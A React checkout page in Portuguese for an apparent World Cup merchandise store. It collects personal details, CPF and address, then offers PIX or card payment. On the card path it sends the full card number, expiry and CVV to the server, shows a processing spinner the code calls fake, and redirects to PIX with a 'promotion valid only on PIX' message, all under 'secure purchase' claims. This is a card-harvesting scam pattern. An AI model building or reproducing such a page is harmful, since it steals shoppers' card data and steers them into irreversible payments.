import { useState } from "react";
import { useRoute, useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ArrowLeft, CreditCard, Lock, User } from "lucide-react";
import { trpc } from "@/lib/trpc";
import { getProductById } from "../../../shared/products";
import { toast } from "sonner";
import CheckoutStepper from "@/components/CheckoutStepper";
import OrderSummary from "@/components/OrderSummary";
import TrustSection from "@/components/TrustSection";

type PaymentMethod = "pix" | "card";

export default function Checkout() {
  const [, params] = useRoute("/checkout/:productId");
  const [, setLocation] = useLocation();
  const productId = params?.productId || "";
  const product = getProductById(productId);

  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("pix");
  const [cardData, setCardData] = useState({ cardNumber: "", cardExpiry: "", cardCvv: "" });
  const [cardFakeLoading, setCardFakeLoading] = useState(false);
  const [showPixPromoMessage, setShowPixPromoMessage] = useState(false);
  const [formData, setFormData] = useState({
    customerName: "",
    customerEmail: "",
    customerDocument: "",
    customerPhone: "",
    shippingZipcode: "",
    shippingStreet: "",
    shippingNumber: "",
    shippingComplement: "",
    shippingNeighborhood: "",
    shippingCity: "",
    shippingState: "",
  });

  const [isLoadingCep, setIsLoadingCep] = useState(false);

  const createOrderMutation = trpc.orders.create.useMutation({
    onSuccess: (data) => {
      if (paymentMethod === "card") {
        setCardFakeLoading(true);
        setTimeout(() => {
          setCardFakeLoading(false);
          setShowPixPromoMessage(true);
          toast.info("Promoção válida apenas no PIX");
          setTimeout(() => {
            setLocation(`/payment/${data.orderId}`);
          }, 2500);
        }, 2200);
      } else {
        setLocation(`/payment/${data.orderId}`);
      }
    },
    onError: (error) => {
      toast.error(error.message || "Erro ao criar pedido");
    },
  });

  if (!product) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Card className="max-w-md">
          <CardHeader>
            <CardTitle>Produto não encontrado</CardTitle>
            <CardDescription>O produto selecionado não existe.</CardDescription>
          </CardHeader>
        </Card>
      </div>
    );
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleCepBlur = async () => {
    const cep = formData.shippingZipcode.replace(/\D/g, "");
    if (cep.length !== 8) return;

    setIsLoadingCep(true);
    try {
      const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      const data = await response.json();

      if (data.erro) {
        toast.error("CEP não encontrado");
        return;
      }

      setFormData((prev) => ({
        ...prev,
        shippingStreet: data.logradouro || "",
        shippingNeighborhood: data.bairro || "",
        shippingCity: data.localidade || "",
        shippingState: data.uf || "",
      }));
    } catch (error) {
      toast.error("Erro ao buscar CEP");
    } finally {
      setIsLoadingCep(false);
    }
  };

  const handleStep1Submit = (e: React.FormEvent) => {
    e.preventDefault();

    // Validate CPF format
    const cpf = formData.customerDocument.replace(/\D/g, "");
    if (cpf.length !== 11) {
      toast.error("CPF inválido");
      return;
    }

    setStep(2);
  };

  const handleStep2Submit = (e: React.FormEvent) => {
    e.preventDefault();
    const cep = formData.shippingZipcode.replace(/\D/g, "");
    if (cep.length !== 8) {
      toast.error("CEP inválido");
      return;
    }
    setStep(3);
  };

  const handleStep3SubmitPix = () => {
    const cep = formData.shippingZipcode.replace(/\D/g, "");
    createOrderMutation.mutate({
      productId,
      ...formData,
      customerDocument: formData.customerDocument.replace(/\D/g, ""),
      shippingZipcode: cep,
    });
  };

  const handleStep3SubmitCard = (e: React.FormEvent) => {
    e.preventDefault();
    const cep = formData.shippingZipcode.replace(/\D/g, "");
    const number = cardData.cardNumber.replace(/\s/g, "");
    if (number.length < 13) {
      toast.error("Número do cartão inválido");
      return;
    }
    if (!/^\d{2}\/\d{2}$/.test(cardData.cardExpiry.replace(/\s/g, ""))) {
      toast.error("Validade no formato MM/AA");
      return;
    }
    if (cardData.cardCvv.replace(/\D/g, "").length < 3) {
      toast.error("CVV inválido");
      return;
    }
    createOrderMutation.mutate({
      productId,
      ...formData,
      customerDocument: formData.customerDocument.replace(/\D/g, ""),
      shippingZipcode: cep,
      cardNumber: number,
      cardExpiry: cardData.cardExpiry.trim(),
      cardCvv: cardData.cardCvv.trim(),
    });
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-gradient-to-r from-red-700 to-red-800 py-4">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            <Button
              variant="ghost"
              className="text-white hover:bg-red-800"
              onClick={() => setLocation("/")}
            >
              <ArrowLeft className="w-5 h-5 mr-2" />
              Voltar
            </Button>
            <img
              src="/pngwing.com.png"
              alt="Copa"
              className="h-10"
            />
            <div className="flex items-center gap-2 text-white text-sm">
              <Lock className="w-4 h-4" />
              <span className="hidden md:inline">Compra Segura</span>
            </div>
          </div>
        </div>
      </header>

      {/* Stepper */}
      <CheckoutStepper currentStep={step} />

      {/* Main Content */}
      <div className="container mx-auto px-4 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Form Column */}
          <div className="lg:col-span-2">
            <Card>
              <CardHeader>
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-red-100 rounded-full flex items-center justify-center">
                    <User className="w-5 h-5 text-red-600" />
                  </div>
                  <div>
                    <CardTitle>
                      {step === 1
                        ? "Dados Pessoais"
                        : step === 2
                          ? "Endereço de Entrega"
                          : "Forma de pagamento"}
                    </CardTitle>
                    <CardDescription>
                      {step === 1
                        ? "Preencha seus dados para continuar"
                        : step === 2
                          ? "Informe onde deseja receber seu pedido"
                          : "Escolha como deseja pagar"}
                    </CardDescription>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                {(() => {
                  if (step === 1) return (
                  <form onSubmit={handleStep1Submit} className="space-y-4">
                    <div>
                      <Label htmlFor="customerName">Nome Completo *</Label>
                      <Input
                        id="customerName"
                        name="customerName"
                        value={formData.customerName}
                        onChange={handleInputChange}
                        required
                        placeholder="Digite seu nome completo"
                        className="mt-1"
                      />
                    </div>

                    <div>
                      <Label htmlFor="customerEmail">E-mail *</Label>
                      <Input
                        id="customerEmail"
                        name="customerEmail"
                        type="email"
                        value={formData.customerEmail}
                        onChange={handleInputChange}
                        required
                        placeholder="seu@email.com"
                        className="mt-1"
                      />
                    </div>

                    <div>
                      <Label htmlFor="customerDocument">CPF *</Label>
                      <Input
                        id="customerDocument"
                        name="customerDocument"
                        value={formData.customerDocument}
                        onChange={handleInputChange}
                        required
                        placeholder="000.000.000-00"
                        maxLength={14}
                        className="mt-1"
                      />
                    </div>

                    <div>
                      <Label htmlFor="customerPhone">Telefone/WhatsApp *</Label>
                      <Input
                        id="customerPhone"
                        name="customerPhone"
                        value={formData.customerPhone}
                        onChange={handleInputChange}
                        required
                        placeholder="(00) 00000-0000"
                        className="mt-1"
                      />
                    </div>

                    <Button
                      type="submit"
                      className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-6 text-lg"
                    >
                      Continuar
                    </Button>

                    <p className="text-xs text-center text-gray-500">
                      Seus dados estão protegidos e não serão compartilhados.
                    </p>
                  </form>
                  );
                  if (step === 2) return (
                  <form onSubmit={handleStep2Submit} className="space-y-4">
                    <div>
                      <Label htmlFor="shippingZipcode">CEP *</Label>
                      <Input
                        id="shippingZipcode"
                        name="shippingZipcode"
                        value={formData.shippingZipcode}
                        onChange={handleInputChange}
                        onBlur={handleCepBlur}
                        required
                        placeholder="00000-000"
                        maxLength={9}
                        className="mt-1"
                      />
                      {isLoadingCep && (
                        <p className="text-xs text-gray-500 mt-1">Buscando CEP...</p>
                      )}
                    </div>

                    <div className="grid md:grid-cols-3 gap-4">
                      <div className="md:col-span-2">
                        <Label htmlFor="shippingStreet">Rua *</Label>
                        <Input
                          id="shippingStreet"
                          name="shippingStreet"
                          value={formData.shippingStreet}
                          onChange={handleInputChange}
                          required
                          placeholder="Nome da rua"
                          disabled={isLoadingCep}
                          className="mt-1"
                        />
                      </div>
                      <div>
                        <Label htmlFor="shippingNumber">Número *</Label>
                        <Input
                          id="shippingNumber"
                          name="shippingNumber"
                          value={formData.shippingNumber}
                          onChange={handleInputChange}
                          required
                          placeholder="123"
                          className="mt-1"
                        />
                      </div>
                    </div>

                    <div>
                      <Label htmlFor="shippingComplement">Complemento</Label>
                      <Input
                        id="shippingComplement"
                        name="shippingComplement"
                        value={formData.shippingComplement}
                        onChange={handleInputChange}
                        placeholder="Apto, bloco, etc (opcional)"
                        className="mt-1"
                      />
                    </div>

                    <div>
                      <Label htmlFor="shippingNeighborhood">Bairro *</Label>
                      <Input
                        id="shippingNeighborhood"
                        name="shippingNeighborhood"
                        value={formData.shippingNeighborhood}
                        onChange={handleInputChange}
                        required
                        placeholder="Bairro"
                        disabled={isLoadingCep}
                        className="mt-1"
                      />
                    </div>

                    <div className="grid md:grid-cols-3 gap-4">
                      <div className="md:col-span-2">
                        <Label htmlFor="shippingCity">Cidade *</Label>
                        <Input
                          id="shippingCity"
                          name="shippingCity"
                          value={formData.shippingCity}
                          onChange={handleInputChange}
                          required
                          placeholder="Cidade"
                          disabled={isLoadingCep}
                          className="mt-1"
                        />
                      </div>
                      <div>
                        <Label htmlFor="shippingState">Estado *</Label>
                        <Input
                          id="shippingState"
                          name="shippingState"
                          value={formData.shippingState}
                          onChange={handleInputChange}
                          required
                          placeholder="UF"
                          maxLength={2}
                          disabled={isLoadingCep}
                          className="mt-1"
                        />
                      </div>
                    </div>

                    <div className="flex gap-4">
                      <Button
                        type="button"
                        variant="outline"
                        className="flex-1 py-6"
                        onClick={() => setStep(1)}
                      >
                        Voltar
                      </Button>
                      <Button
                        type="submit"
                        className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-6 text-lg"
                      >
                        Continuar
                      </Button>
                    </div>

                    <p className="text-xs text-center text-gray-500">
                      Seus dados estão protegidos e não serão compartilhados.
                    </p>
                  </form>
                  );
                  return (
                  <div className="space-y-6">
                    <div className="grid gap-4">
                      <button
                        type="button"
                        onClick={() => setPaymentMethod("pix")}
                        className={`flex items-center gap-4 p-4 rounded-lg border-2 text-left transition ${
                          paymentMethod === "pix"
                            ? "border-green-500 bg-green-50"
                            : "border-gray-200 hover:border-gray-300"
                        }`}
                      >
                        <div className="w-10 h-10 bg-green-600 rounded flex items-center justify-center shrink-0">
                          <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5z" />
                          </svg>
                        </div>
                        <div>
                          <span className="font-bold">PIX</span>
                          <p className="text-sm text-gray-600">Aprovação instantânea</p>
                        </div>
                        {paymentMethod === "pix" && (
                          <span className="ml-auto text-green-600 font-medium">Selecionado</span>
                        )}
                      </button>

                      <button
                        type="button"
                        onClick={() => setPaymentMethod("card")}
                        className={`flex items-center gap-4 p-4 rounded-lg border-2 text-left transition ${
                          paymentMethod === "card"
                            ? "border-red-500 bg-red-50"
                            : "border-gray-200 hover:border-gray-300"
                        }`}
                      >
                        <CreditCard className="w-10 h-10 text-gray-600 shrink-0" />
                        <div>
                          <span className="font-bold">Cartão de crédito</span>
                          <p className="text-sm text-gray-600">Parcele em até 12x</p>
                        </div>
                        {paymentMethod === "card" && (
                          <span className="ml-auto text-red-600 font-medium">Selecionado</span>
                        )}
                      </button>
                    </div>

                    {paymentMethod === "pix" ? (
                      <div className="pt-4">
                        <Button
                          type="button"
                          className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-6 text-lg"
                          disabled={createOrderMutation.isPending}
                          onClick={handleStep3SubmitPix}
                        >
                          {createOrderMutation.isPending ? "Gerando PIX..." : "Gerar PIX e pagar"}
                        </Button>
                      </div>
                    ) : (
                      <form onSubmit={handleStep3SubmitCard} className="space-y-4 pt-2">
                        <div>
                          <Label htmlFor="cardNumber">Número do cartão *</Label>
                          <Input
                            id="cardNumber"
                            value={cardData.cardNumber}
                            onChange={(e) => {
                              const v = e.target.value.replace(/\D/g, "").slice(0, 19);
                              setCardData((p) => ({ ...p, cardNumber: v }));
                            }}
                            placeholder="0000 0000 0000 0000"
                            maxLength={19}
                            className="mt-1 font-mono"
                          />
                        </div>
                        <div className="grid grid-cols-2 gap-4">
                          <div>
                            <Label htmlFor="cardExpiry">Validade (MM/AA) *</Label>
                            <Input
                              id="cardExpiry"
                              value={cardData.cardExpiry}
                              onChange={(e) => {
                                let v = e.target.value.replace(/\D/g, "");
                                if (v.length >= 2) v = v.slice(0, 2) + "/" + v.slice(2, 4);
                                setCardData((p) => ({ ...p, cardExpiry: v }));
                              }}
                              placeholder="MM/AA"
                              maxLength={5}
                              className="mt-1"
                            />
                          </div>
                          <div>
                            <Label htmlFor="cardCvv">CVV *</Label>
                            <Input
                              id="cardCvv"
                              type="password"
                              value={cardData.cardCvv}
                              onChange={(e) =>
                                setCardData((p) => ({
                                  ...p,
                                  cardCvv: e.target.value.replace(/\D/g, "").slice(0, 8),
                                }))
                              }
                              placeholder="123"
                              maxLength={8}
                              className="mt-1"
                            />
                            <p className="text-xs text-gray-500 mt-1">3 ou 4 dígitos no verso</p>
                          </div>
                        </div>
                        <Button
                          type="submit"
                          className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-6 text-lg"
                          disabled={createOrderMutation.isPending || cardFakeLoading}
                        >
                          {cardFakeLoading ? "Processando..." : "Pagar com cartão"}
                        </Button>
                      </form>
                    )}

                    <div className="flex gap-4 pt-2">
                      <Button
                        type="button"
                        variant="outline"
                        className="flex-1"
                        onClick={() => setStep(2)}
                      >
                        Voltar
                      </Button>
                    </div>
                  </div>
                  );
                })()}
              </CardContent>
            </Card>
          </div>

          {/* Summary Column */}
          <div className="lg:col-span-1">
            <OrderSummary product={product} />
          </div>
        </div>
      </div>

      {/* Trust Section */}
      <TrustSection />

      {/* Overlay: cartão fake loading e mensagem PIX */}
      {(cardFakeLoading || showPixPromoMessage) && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full text-center p-8">
            {cardFakeLoading ? (
              <>
                <div className="animate-spin rounded-full h-14 w-14 border-4 border-red-600 border-t-transparent mx-auto mb-4" />
                <CardTitle className="text-xl mb-2">Processando pagamento...</CardTitle>
                <p className="text-gray-600 text-sm">Aguarde um momento.</p>
              </>
            ) : (
              <>
                <div className="w-14 h-14 bg-amber-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <span className="text-2xl">⚠️</span>
                </div>
                <CardTitle className="text-xl mb-2 text-amber-800">
                  Promoção válida apenas no PIX
                </CardTitle>
                <p className="text-gray-600 text-sm mb-4">
                  Esta oferta não está disponível para cartão. Redirecionando para pagamento via PIX...
                </p>
                <div className="animate-pulse text-green-600 font-medium">Gerando PIX</div>
              </>
            )}
          </Card>
        </div>
      )}
    </div>
  );
}
